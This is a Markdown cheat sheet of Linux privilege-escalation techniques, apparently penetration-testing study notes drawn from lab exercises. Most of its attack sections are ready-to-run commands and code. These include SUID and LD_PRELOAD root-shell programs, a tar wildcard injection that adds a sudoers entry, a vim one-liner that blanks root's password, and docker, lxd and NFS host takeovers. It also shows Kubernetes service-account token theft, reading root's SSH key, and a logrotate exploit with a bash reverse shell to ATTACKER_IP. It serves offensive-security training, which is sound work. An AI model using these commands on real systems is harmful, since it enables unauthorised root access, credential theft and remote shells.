# Linux Privilege Escalation
- [Enumeration](#Enumeration)
    - [Find Commands](#find-commands)
    - [Network](#network)
- [Environment-Based Privilege Escalation](#environment-based-privilege-escalation)
    - [PATH Abuse](#path-abuse)
    - [Wildcard Abuse](#wildcard-abuse)
    - [Escaping Restricted Shells](#escaping-restricted-shells)
- [Permissions-based Privilege Escalation](#permissions-based-privilege-escalation)
    - [SUID (Special Permissions)](#suid-special-permissions)
    - [SUDO Abuse](#sudo-abuse)
    - [Privileged Group](#privileged-groups)
        - [LXC / LXD](#lxc--lxd)
        - [Docker](#docker)
        - [Disk](#disk)
        - [ADM](#adm)
    - [Capabilities](#capabilities)
- [Service-based Privilege Escalation](#service-based-privilege-escalation)
    - [Vulnerable Services](#vulnerable-services)
    - [Cron Job Abuse](#cron-job-abuse)
    - [Containers](#containers)
        - [Linux Daemon - LXD](#linux-daemon---lxd)
        - [Docker](#docker-1)
        - [Kubernetes](#kubernetes)
    - [Logrotate](#logrotate)
    - [Miscellaneous Techniques](#miscellaneous-techniques)
        - [Passive Traffic Capture](#passive-traffic-capture)
        - [Weak NFS Privileges](#weak-nfs-privileges)
        - [Hijacking Tmux Sessions](#hijacking-tmux-sessions)
- [Linux Internals-based Privilege Escalation](#linux-internals-based-privilege-escalation)
    - [Kernal Exploits](#kernel-exploits)
    - [Shared Libraries](#shared-libraries)
        - [Leverage LD_PRELOAD](#leverage-ld_preload)
    


## Enumeration
- [ ] `hostname`
- [ ] `uname -a`
- [ ] Information about the processes and the target: `cat /proc/version` `/etc/issue` `/etc/os-release`
- [ ] login shells exits `cat /etc/shells`
- [ ] Mounted and unmounted drives `cat /etc/fstab`
- [ ] Discover users on the system: `cat /etc/passwd` >> to beautify output `cat /etc/passwd | cut -d ":" -f 1`
- [ ] `cat /etc/group`
- [ ] Unmounted File Systems `cat /etc/fstab | grep -v "#" | column -t`
- [ ] `ls` `id` 
- [ ] List all binaries `ls -l /bin /usr/bin/ /usr/sbin/`
- [ ] `lsblk` enumerate information about block devices on the system
- [ ] `lpstat` found information about any printers in the system
- [ ] Temp files `ls -l /tmp /var/tmp /dev/shm`
- [ ] Check for any cron jobs on the system.`ls -la /etc/cron.daily/`
- [ ] User's last login `lastlog`
- [ ] CPU type/version `lscpu`
- [ ] All processes running on the target: `ps -A` , Process tree: `ps axjf`
- [ ] Environment variables `env`
- [ ] List all commands your user can run using sudo `sudo -l` and check whether sudo version is vulnerable or not `sudo -V`
- [ ] `df -h` mounted file systems
- [ ] Check if anyone else is currently on the system with us `who` `finger`
>[!NOTE]
> Search about pattern in files `grep -ri -l 'your-pattern-here' / 2>/dev/null`

- [ ] Finding history file `find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null`
- [ ] Show all hidden files `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null`
- [ ] Show all hidden directories `find / -type d -name ".*" -ls 2>/dev/null`
- [ ] Search about proc file system `find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"`
- [ ] Search about Configuration files `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null`
- [ ] Search about scripts on the system `find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"`
- [ ] `history`
> [!TIP]
>    - Create a list of installed packages to work with `apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list`
>   - Compare the existing binaries with the ones from GTFObins to see which binaries we should investigate later.
    ```
    for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | grep -E '^[a-zA-Z0-9_]+$'); do 
        if grep -q "$i" installed_pkgs.list; then 
            echo "Check GTFO for: $i"; 
        fi
    done
    ```
- [ ] strace on Linux-based operating systems to track and analyze system calls and signal processing.`strace ping -c1 10.129.112.20`

- Credential Hunting
    - [ ] `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`

### find Commands
- `find . -name flag1.txt` search about flag1.txt in the current directory
- `find / -type d -name config` find the directory named config under "/"
- `find / -type f -perm 0777` find files with the 777 permissions (files readable, writable, and executable by all users)
- `find / -perm a=x` find executable files
- `find /home -user frank` find all files for user "frank" under "/home"
- `find / -mtime 10` find files that were modified in the last 10 days
- `find / -atime 10` find files that were accessed in the last 10 day
- `find / -cmin -60` find files changed within the last hour (60 minutes)
- `find / -amin -60` find files accesses within the last hour (60 minutes)
- `find / -size 50M` find files with a 50 MB size
- `find / -name gcc*`
- Folders and files that can be written to or executed from:
    - `find / -writable -type d 2>/dev/null` : Find world-writeable folders
    - `find / -perm -222 -type d 2>/dev/null` : Find world-writeable folders
    - `find / -perm -o w -type d 2>/dev/null` : Find world-writeable folders
    - `find / -perm -u=s -type f 2>/dev/null` : Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 
### Network 
- [ ] `ifconfig`
- [ ] `ip route`
- [ ] `ls -l ~/.ssh`
- [ ] `cat /etc/resolv.conf` `/etc/hosts`
- Netstat Commands
    - `netstat -a`: Shows all listening ports and established connections.
    - `netstat -l`: list ports in "listening" mode. 
    - `netstat -s`: list network usage statistics by protocol.
    - `netstat -tp`: list connections with the service name and PID information.
    - `netstat -i`: Shows interface statistics. 
    - `netstat -ano` could be broken down as follows:
        -a: Display all sockets
        -n: Do not resolve names
        -o: Display timers

## Environment-Based Privilege Escalation
### PATH Abuse
- [ ] `echo $PATH`

- Adding malicious script to PATH
    - Steps:
    1. Make file path_exp.c
    ```
    #include<unistd.h>
    void main()
    { setuid(0);
    setgid(0); 
    system("love");
    }
    ```
    2. We compile this into an executable and set the SUID bit. 
        - `gcc path_exp.c -o path -w`
        - `chmod u+s path`
    3. A simple search for writable folders can done using the  `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u` . The folder that will be easier to write to is probably /tmp. In almost cases; because /tmp is not present in PATH so we will need to add it. the `export PATH=/tmp:$PATH` command accomplishes this.
    4. 
    - `cd /tmp`
    - `echo "/bin/bash" > love`
    - `chmod 777 love`
    - `./path`

### Wildcard Abuse
- Vulnerable cronjob e.g. `*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *`
- Creating malicious files so I can use it as options to tar command.
```
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

### Escaping Restricted Shells
- Command Injection: 
```
ls -l `id`
```
 this command would cause the ls command to be executed with the argument -l, followed by the output of the id command.

- Command Substitution: this involves using the shell's command substitution syntax to execute a command.
```
echo $(<file.txt)
```

- Command Chaining: semicolon(;) or vertical bar(|) ....etc
- Environment Variables: modify or create environment variables that the shell uses to execute commands that are not restricted by the shell.
- Shell Functions: the shell allows users to define and call shell functions,it may be possible to escape from the shell by defining a shell function that executes a command.

## Permissions-based Privilege Escalation
### SUID (Special Permissions)

- `find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.
- `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
- `find / -uid 0 -perm -6000 -type f 2>/dev/null`
 

### SUDO Abuse

- The sudo command, by default, allows you to run a program with root privileges.
- Any user can check its current situation related to root privileges using the `sudo -l` command. 

### Privileged Groups

#### LXC / LXD
- LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group.Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root.
- Steps:
    -  `lxd init`
    - Import the local image `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`
    - Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the host. `lxc init alpine r00t -c security.privileged=true`
    - Mount the host file system `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`
    - Spawn a shell inside the container instance ` lxc start r00t` `lxc exec r00t /bin/sh`
#### Docker
- Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`.

#### Disk 
- Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges.

#### ADM
- Members of the adm group are able to read all logs stored in `/var/log`.

### Capabilities
- enumerate all existing capabilities for all existing binary executables on a Linux system
    - `getcap -r / 2>/dev/null`
    - `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;` 

- e.g.
```  
getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```
- We can use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file
```
/usr/bin/vim.basic /etc/passwd
```
- make these changes in a non-interactive mode: ` echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd`

## Service-based Privilege Escalation

### Vulnerable Services
- Many services may be found, which have flaws that can be leveraged to escalate privileges.

### Cron Job Abuse
- the cron file created in `/var/spool/cron`.
- [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges.We can use it to see commands run by other users, cron jobs, etc.
```
# print both commands and file system events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000
```

### Containers
#### Linux Daemon - LXD
- We must be in either the lxc or lxd group. e.g.
```
id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```
- Import the image: `lxc image import ubuntu-template.tar.xz --alias ubuntutemp`
-  we can initiate the image and configure it by specifying the security.privileged flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.
```
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
-
 ```
lxc start privesc
lxc exec privesc /bin/bash 
```

#### Docker 
- Run container and spawn shell
```
docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```
- [ ] Check whether docker socket is writable .The socket located in `/var/run/docker.sock`
- `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash`

#### Kubernetes
![Kubernetes](../../../../images/components-of-kubernetes.png)
- An orchestration tool for managing containers
- The Control Plane serves as the management layer. It consists of several crucial components, including:

|Service|TCP Ports|
|:------:|:---------:|
|etcd|2379, 2380|
|API server|6443|
|Scheduler|10251|
|Controller Manager|10252|
|Kubelet API|10250|
|Read-Only Kubelet API|10255|

- **Kubernetes API:**  The core of Kubernetes architecture is its API, which serves as the main point of contact for all internal and external interactions.
- The kube-apiserver is responsible for hosting the API, which handles and verifies RESTful requests for modifying the system's state.

> [!IMPORTANT]
> In Kubernetes, the Kubelet can be configured to permit anonymous access. By default, the Kubelet allows anonymous access.
- K8's API Server Interaction
```
cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k

{
	"kind": "Status",
	"apiVersion": "v1",
	"metadata": {},
	"status": "Failure",
	"message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
	"reason": "Forbidden",
	"details": {},
	"code": 403
}
```
- Extracting Pods `curl https://10.129.10.11:10250/pods -k | jq .`
- Kubeletctl - Extracting Pods `kubeletctl -i --server 10.129.10.11 pods`
- `scan rce` command in kubeletctl `kubeletctl -i --server 10.129.10.11 scan rce`   
    - Kubelet API - Executing Commands: `kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx` p is pod's name and c is container's name

- Utilizing a tool called **[Kubeletctl](https://github.com/cyberark/kubeletctl)** to obtain the Kubernetes service account's token and certificate (ca.crt) from the server.
- Steps to Escalate our Privileges
    - Kubelet API - Extracting Tokens `kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token`
    - Kubelet API - Extracting Certificates `kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt`
    - Now that we have both the token and certificate, we can check the access rights in the Kubernetes cluster.
    - List Privileges
        - export token=`cat k8.token`
        - `kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list`
    - We can create a YAML file that we can use to create a new container and mount the entire root filesystem from the host system into this container's /root directory. The YAML file could look like following:
```
    apiVersion: v1
    kind: Pod
    metadata:
    name: privesc
    namespace: default
    spec:
    containers:
    - name: privesc
        image: nginx:1.14.2
        volumeMounts:
        - mountPath: /root
        name: mount-root-into-mnt
    volumes:
    - name: mount-root-into-mnt
        hostPath:
        path: /
    automountServiceAccountToken: true
    hostNetwork: true
```
- Create New pod: `kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml`
- Show running pods: `kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods`
- Now we can obtain sensitive information or spawn a reverse shell e.g. `kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc`
### Logrotate
- Every Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called logrotate takes care of archiving or disposing of old logs.
- Configuration files `/etc/logrotate.conf` and `/etc/logrotate.d/` 
- To force a new rotation on the same day, we can set the date after the individual log files in the status file /var/lib/logrotate.status or use the -f/--force option:
```
sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```
- To exploit logrotate, we need some requirements that we have to fulfill:
    1. we need write permissions on the log files
    2. logrotate must run as a privileged user or root
> [!NOTE] 
> This vulnerability affects logrotate version 3.18.0 and older.
- **[Logrotate Exploit](https://github.com/whotwagner/logrotten)**
    - Compile: `gcc logrotten.c -o logrotten`
    - Spawn a reverse shell: `echo 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' > payload` 
    - Determine which option logrotate uses in logrotate.conf: `grep "create\|compress" /etc/logrotate.conf | grep -v "#"`

### Miscellaneous Techniques
#### Passive Traffic Capture
- Several tools , such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire. This may result in capturing sensitive information such as credit card numbers and SNMP community strings.

#### Weak NFS Privileges
- Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems.
- NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command `showmount -e`
- When an NFS volume is created, various options can be set:
|Option|Description|
|:-----:|:---------|
|root_squash|If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set.|
|no_root_squash|Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.|
-  `cat /etc/exports`
- 
```
cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```
- `gcc shell.c -o shell`
- 
```
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
./shell
```
#### Hijacking Tmux Sessions
- Create a new shared session and modify the ownership.
```
tmux -S /shareds new -s debugsess
chown root:devs /shareds
```

- If we can compromise a user in the dev group, we can attach to this session and gain root access.Check for any running tmux processes. `ps aux | grep tmux`

- Confirm permissions.`ls -la /shareds `
- Review our group membership.`id`
- Finally, attach to the tmux session and confirm root privileges.`tmux -S /shareds`
## Linux Internals-based Privilege Escalation
### Kernel Exploits
- `uname -a` `cat /etc/lsb-release `
- [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)

### Shared Libraries
- It is common for Linux programs to use dynamically linked shared object libraries.
- Two types of libraries exist in Linux: static libraries (denoted by the .a file extension) and dynamically linked shared object libraries (denoted by the .so file extension).
#### Leverage LD_PRELOAD
- LD_PRELOAD environment variable can load a library before executing a binary.It is a function that allows any program to use shared libraries.
>[!NOTE]
> The shared objects required by a binary can be viewed using the `ldd` utility.

- If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run.
- The steps of this privilege escalation vector can be summarized as follows:

    1. Check for LD_PRELOAD (with the env_keep option)
    2. Write a simple C code compiled as a share object (.so extension) file
    3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
- We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters:

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

- We can now use this shared object file when launching any program our user can run with sudo. In our case ,Apache2, find, or almost any of the programs we can run with sudo can be used.

- We need to run the program by specifying the LD_PRELOAD option, as follows:

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

>[!NOTE]
> Make sure to specify the full path to your malicious library file.

## Automated Tools 
-   LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
-   LinEnum: https://github.com/rebootuser/LinEnum
-   Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
-   Linux Priv Checker: https://github.com/linted/linuxprivchecker 
# Resources 
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- https://gtfobins.github.io/
- [Escape from Restricted Shells](https://0xffsec.com/handbook/shells/restricted-shells/)
- [SUID](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits)
- [Bash one-liner reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
